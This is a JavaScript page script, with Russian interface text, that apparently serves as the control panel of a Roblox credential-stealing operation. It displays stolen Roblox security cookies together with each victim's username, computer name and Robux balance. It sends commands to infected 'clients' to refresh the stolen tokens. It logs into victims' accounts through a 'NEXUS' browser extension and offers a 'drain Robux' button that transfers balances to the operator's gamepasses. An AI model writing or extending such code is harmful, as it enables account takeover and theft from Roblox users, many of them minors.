// ── Страница токенов ──────────────────────────────────────────────────────────
if (!requireLogin()) throw new Error('redirect');

document.getElementById('sidebarSlot').innerHTML = renderHeader('tokens');
bindLogout();

let allTokens = [];
let sortMode = 'date';

async function loadTokens() {
  const container = document.getElementById('tokensContainer');
  const skeletonCard = `
    <div class="skeleton-card">
      <div class="skeleton-block" style="width:70px; height:70px; border-radius:50%; margin-top:0.5rem; margin-bottom:1.5rem;"></div>
      <div class="skeleton-block" style="width:120px; margin-bottom:1.5rem;"></div>
      <div class="skeleton-block" style="width:100%; height:45px; border-radius:12px; margin-bottom:0.5rem;"></div>
      <div class="skeleton-block" style="width:100%; height:35px; border-radius:8px; margin-bottom:0.5rem;"></div>
    </div>
  `;
  container.innerHTML = '<div class="tokens-grid">' + skeletonCard + skeletonCard + skeletonCard + skeletonCard + '</div>';
  try {
    const r = await apiFetch('/tokens-data');
    allTokens = await r.json();
    if (!Array.isArray(allTokens)) allTokens = [];

    // Sync old local logins to the server
    for (const t of allTokens) {
      if (!t.file) continue;
      const localVal = localStorage.getItem('login_' + t.file);
      if (localVal && !t.lastLogin) {
        apiFetch('/api/login-mark', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ filename: t.file, timestamp: parseInt(localVal) })
        }).catch(()=>{});
        t.lastLogin = parseInt(localVal);
      }
    }

    updateStats();
    renderTokens();
  } catch (e) {
    if (e.message !== 'auth') {
      container.innerHTML = '<div class="empty"><span class="empty-icon">📭</span>Ошибка загрузки</div>';
      toast('Ошибка загрузки токенов', 'err');
    }
  }
}

function updateStats() {
  const total = allTokens.length;
  const valid = allTokens.filter(t => t.valid).length;
  const totalRobux = allTokens.reduce((s, t) => s + (t.valid && t.robux ? t.robux : 0), 0);
  document.getElementById('sTotal').textContent = total;
  document.getElementById('sValid').textContent = valid;
  document.getElementById('sTotalRobux').textContent = totalRobux.toLocaleString() + ' R$';
}

function renderTokens() {
  const container = document.getElementById('tokensContainer');

  if (allTokens.length === 0) {
    container.innerHTML = '<div class="empty"><span class="empty-icon">📭</span>База токенов пуста</div>';
    return;
  }

  let list = [...allTokens];
  
  const urlParams = new URLSearchParams(window.location.search);
  const filterFile = urlParams.get('file');
  if (filterFile) {
    list = list.filter(t => t.file === filterFile);
    if (list.length === 0) {
      container.innerHTML = '<div class="empty"><span class="empty-icon">📭</span>В этом файле нет токенов</div>';
      return;
    }
  }
  if (sortMode === 'robux') {
    list.sort((a, b) => {
      const ar = (a.valid && a.robux) ? a.robux : -1;
      const br = (b.valid && a.robux) ? b.robux : -1;
      return br - ar;
    });
  } else if (sortMode === 'login') {
    list.sort((a, b) => {
      const loginA = parseInt(a.lastLogin || localStorage.getItem('login_' + (a.file || '')) || '0');
      const loginB = parseInt(b.lastLogin || localStorage.getItem('login_' + (b.file || '')) || '0');
      if (loginA !== loginB) return loginA - loginB;
      return new Date(b.uploadedAt || 0) - new Date(a.uploadedAt || 0);
    });
  } else {
    list.sort((a, b) => new Date(b.uploadedAt || 0) - new Date(a.uploadedAt || 0));
  }

  let html = '<div class="tokens-grid">';

  for (const t of list) {
    const valid = t.valid;
    const badgeClass = valid ? 'badge-valid' : 'badge-invalid';
    const statusText = valid ? '✅' : '❌';
    const tokenFull = escapeHtml(t.security || '');
    const fileId = escapeHtml(t.file || '');

    html += '<div class="token-card">';
    html += '<div class="token-card-status"><span class="badge ' + badgeClass + '" style="padding: 2px 8px; font-size: 0.75rem;">' + statusText + '</span></div>';
    
    if (valid && t.robux !== undefined && t.robux > 0) {
      html += '<div class="token-card-robux">' + t.robux.toLocaleString() + ' R$</div>';
    } else {
      html += '<div class="token-card-robux" style="background: rgba(255,255,255,0.05); color: var(--text-muted); border-color: transparent; box-shadow: none;">0 R$</div>';
    }
    
    let avatarHtml = '<div class="token-card-avatar">👤</div>';
    if (t.userId) {
      avatarHtml = '<div class="token-card-avatar" style="padding:0; overflow:hidden;"><img src="' + API_BASE + '/avatar-proxy/' + t.userId + '" style="width:100%; height:100%; object-fit:cover;" onerror="this.outerHTML=\\\'👤\\\'"></div>';
    }
    html += avatarHtml;
    html += '<div class="token-card-name">' + escapeHtml(t.username || '—') + '</div>';
    html += '<div class="token-card-computer">💻 ' + escapeHtml(t.computer || '—') + '</div>';
    
    html += '<div class="token-card-actions">';
    
    let loginBtnText = 'Войти';
    let loginClass = 'btn-login';
    const lastLogin = t.lastLogin || localStorage.getItem('login_' + fileId);
    if (lastLogin) {
      const d = new Date(parseInt(lastLogin));
      loginBtnText = 'Заходил ' + d.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}) + ' ' + d.toLocaleDateString();
      loginClass = 'btn-login logged-in';
    }
    
    if (t.security) {
      html += '<div style="display:flex; gap:8px;">';
      html += '<button class="' + loginClass + '" style="flex:1;" onclick="loginToRoblox(\'' + tokenFull.replace(/'/g, "\\'") + '\', this, \'' + fileId.replace(/'/g, "\\'") + '\')">' + loginBtnText + '</button>';
      html += '<button class="btn-secondary" title="Запросить новый токен" style="width:auto; padding:0 12px; border-color: rgba(0, 240, 255, 0.3); color: var(--accent); background: rgba(0, 240, 255, 0.05);" onclick="requestToken(\'' + fileId.replace(/'/g, "\\'") + '\')">📡</button>';
      html += '<button class="btn-secondary" title="Удалить токен" style="width:auto; padding:0 12px; border-color: rgba(255, 0, 85, 0.3); color: var(--danger); background: rgba(255, 0, 85, 0.05);" onclick="deleteToken(\'' + fileId.replace(/'/g, "\\'") + '\')">🗑️</button>';
      html += '</div>';
      if (valid && t.robux !== undefined && t.robux > 0) {
        html += '<button class="btn-secondary" style="margin-top:0.5rem; width:100%; color: #10b981; border-color: rgba(16, 185, 129, 0.3); background: rgba(16, 185, 129, 0.05);" onclick="drainRobux(\'' + tokenFull.replace(/'/g, "\\'") + '\', this)">💸 Слить Robux</button>';
      }
    } else {
      // no login button if no security token
    }
    
    html += '</div></div>';
  }

  html += '</div>';
  container.innerHTML = html;
}

// ── Проверить один токен ──────────────────────────────────────────────────────
async function checkSingle(filename) {
  toast('⏳ Проверка...');
  try {
    const r = await apiFetch('/robux-check-file', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ filename })
    });
    const info = await r.json();
    // Обновляем локальные данные
    const idx = allTokens.findIndex(t => t.file === filename);
    if (idx >= 0) {
      allTokens[idx] = { ...allTokens[idx], ...info };
      updateStats();
      renderTokens();
    }
    if (info.valid) {
      toast('💰 ' + (info.robux ? info.robux.toLocaleString() + ' R$' : 'OK'));
    } else {
      toast('❌ ' + (info.error || 'Невалид'), 'err');
    }
  } catch (e) {
    if (e.message !== 'auth')    toast('Нет связи с расширением NEXUS. Проверьте, установлено ли оно.', 'err');
  }
}

// ── Слить Robux ───────────────────────────────────────────────────────────────
function drainRobux(token, btn) {
  const drainGamepasses = localStorage.getItem('ft_drainGamepasses') || '';
  if (!drainGamepasses) {
    toast('Ошибка: Не настроены ID геймпассов! Перейдите в Настройки.', 'err');
    return;
  }
  
  if (confirm('Вы уверены, что хотите перевести все доступные робуксы с этого аккаунта на ваши геймпассы?')) {
    const originalText = btn.innerHTML;
    btn.innerHTML = '⏳ В процессе...';
    btn.disabled = true;
    
    let passesList = [];
    try {
      const parsed = JSON.parse(drainGamepasses);
      passesList = Object.values(parsed).filter(Boolean);
    } catch(e) {
      passesList = drainGamepasses.split(',').map(s => s.trim()).filter(Boolean);
    }
    
    window.postMessage({ action: 'drain_robux_event', token: token, gamepasses: passesList }, '*');
    toast('Задача на перевод робуксов отправлена в расширение NEXUS!');
    
    // Сброс кнопки через 5 сек (т.к. асинхронно в фоне)
    setTimeout(() => {
      btn.innerHTML = originalText;
      btn.disabled = false;
    }, 5000);
  }
}

// ── Проверить все токены ─────────────────────────────────────────────────────────────
document.getElementById('btnCheckAll').addEventListener('click', async function() {
  const btn = this;
  btn.disabled = true;
  btn.innerHTML = '<span style="font-size: 1.2rem;">⏳</span> Проверка...';
  try {
    const r = await apiFetch('/robux-bulk', { method: 'POST' });
    const results = await r.json();
    if (Array.isArray(results)) {
      allTokens = results;
      updateStats();
      renderTokens();
      const valid = results.filter(r => r.valid).length;
      toast('✅ Проверено: ' + valid + '/' + results.length + ' рабочих');
    }
  } catch (e) {
    if (e.message !== 'auth') toast('Ошибка проверки', 'err');
  }
  btn.disabled = false;
  btn.innerHTML = '<span style="font-size: 1.2rem;">⟳</span> Проверить все';
});

// ── Запросить все токены ─────────────────────────────────────────────────────────────
document.getElementById('btnRequestAll')?.addEventListener('click', async function() {
  const btn = this;
  if (!confirm('Отправить команду всем клиентам на принудительное обновление токенов? (Компьютеры должны быть включены)')) return;
  const originalHtml = btn.innerHTML;
  btn.disabled = true;
  btn.innerHTML = '<span style="font-size: 1.2rem;">⏳</span> Запрос...';
  try {
    await apiFetch('/request-token-all', { method: 'POST' });
    toast('✅ Запрос на обновление отправлен всем клиентам!');
  } catch (e) {
    if (e.message !== 'auth') toast('Ошибка отправки запроса', 'err');
  }
  btn.disabled = false;
  btn.innerHTML = originalHtml;
});

// ── Запросить один токен ─────────────────────────────────────────────────────────────
async function requestToken(filename) {
  if (!confirm('Отправить команду на принудительное обновление токена для этого клиента?')) return;
  try {
    const r = await apiFetch('/request-token', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ filename })
    });
    if (r.ok) {
      toast('✅ Запрос на обновление токена отправлен!');
    } else {
      toast('❌ Ошибка при отправке запроса', 'err');
    }
  } catch (e) {
    if (e.message !== 'auth') toast('Ошибка соединения', 'err');
  }
}

// ── Копирование ───────────────────────────────────────────────────────────────
function copyText(text) {
  if (!text) return;
  navigator.clipboard.writeText(text).then(() => toast('📋 Скопировано')).catch(() => {
    const ta = document.createElement('textarea');
    ta.value = text;
    document.body.appendChild(ta);
    ta.select();
    document.execCommand('copy');
    document.body.removeChild(ta);
    toast('📋 Скопировано');
  });
}

// ── Вход в Roblox по токену ───────────────────────────────────────────────────
function loginToRoblox(token, btn, fileId) {
  if (!token) return;
  btn.textContent = '⏳...';
  btn.disabled = true;

  function handler(e) {
    if (e.data && e.data.type === 'nexus-login-response') {
      window.removeEventListener('message', handler);
      if (e.data.ok) {
        if (fileId) {
          apiFetch('/api/login-mark', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ filename: fileId })
          }).catch(()=>{});
          const tokenData = allTokens.find(t => t.file === fileId);
          if (tokenData) tokenData.lastLogin = Date.now();
        }
        const d = new Date();
        btn.textContent = 'Заходил ' + d.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}) + ' ' + d.toLocaleDateString();
        btn.className = 'btn-login logged-in';
        btn.disabled = false;
        toast('✅ Вход выполнен, открываем Roblox...');
      } else {
        restoreBtnText();
        toast('⚠️ Установи расширение NEXUS для входа', 'err');
      }
    }
  }

  function restoreBtnText() {
    const tokenData = allTokens.find(t => t.file === fileId);
    const lastLogin = (tokenData && tokenData.lastLogin) ? tokenData.lastLogin : (fileId ? localStorage.getItem('login_' + fileId) : null);
    if (lastLogin) {
      const d = new Date(parseInt(lastLogin));
      btn.textContent = 'Заходил ' + d.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}) + ' ' + d.toLocaleDateString();
      btn.className = 'btn-login logged-in';
    } else {
      btn.textContent = 'Войти';
      btn.className = 'btn-login';
    }
    btn.disabled = false;
  }

  window.addEventListener('message', handler);
  window.postMessage({ type: 'nexus-login', token }, '*');
  setTimeout(() => {
    window.removeEventListener('message', handler);
    restoreBtnText();
    toast('⚠️ Установи расширение NEXUS для входа', 'err');
  }, 800);
}

// ── Сортировка ────────────────────────────────────────────────────────────────
document.getElementById('btnSortDate').addEventListener('click', function() {
  sortMode = 'date';
  this.classList.add('active');
  document.getElementById('btnSortRobux').classList.remove('active');
  document.getElementById('btnSortLogin').classList.remove('active');
  renderTokens();
});

document.getElementById('btnSortRobux').addEventListener('click', function() {
  sortMode = 'robux';
  this.classList.add('active');
  document.getElementById('btnSortDate').classList.remove('active');
  document.getElementById('btnSortLogin').classList.remove('active');
  renderTokens();
});

document.getElementById('btnSortLogin').addEventListener('click', function() {
  sortMode = 'login';
  this.classList.add('active');
  document.getElementById('btnSortDate').classList.remove('active');
  document.getElementById('btnSortRobux').classList.remove('active');
  renderTokens();
});

loadTokens();

async function deleteToken(fileId) {
  if (!confirm('Вы уверены, что хотите удалить этот токен?')) return;
  try {
    const r = await apiFetch('/files/' + encodeURIComponent(fileId), { method: 'DELETE' });
    if (r.ok) {
      toast('Токен удален', 'success');
      loadTokens();
    } else {
      toast('Ошибка удаления', 'err');
    }
  } catch (e) {
    if (e.message !== 'auth') toast('Ошибка соединения', 'err');
  }
}
